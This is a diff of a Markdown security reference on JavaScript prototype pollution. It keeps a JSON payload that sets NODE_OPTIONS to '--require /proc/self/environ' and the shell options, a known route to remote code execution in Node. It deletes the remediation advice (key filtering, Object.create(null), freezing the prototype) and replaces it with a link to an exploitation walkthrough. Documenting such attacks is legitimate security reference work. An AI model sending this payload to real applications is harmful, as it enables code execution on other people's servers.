@@ -37,10 +37,9 @@ In JavaScript, polluting `Object.prototype` injects properties into *every* obje
 {"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
 ```
 
-## :material-shield-check: Remediation
+## :material-video-outline: Deep dive
 
-- Reject `__proto__` / `constructor` / `prototype` keys during merge; use `Map` or `Object.create(null)`.
-- `Object.freeze(Object.prototype)`; keep libraries (lodash, jQuery) patched.
+- Walkthrough of client- and server-side prototype pollution gadget hunting: [YouTube — prototype pollution to RCE](https://www.youtube.com/watch?v=xQ8poeX1_dI).
 
 ## :material-link-variant: Related
 
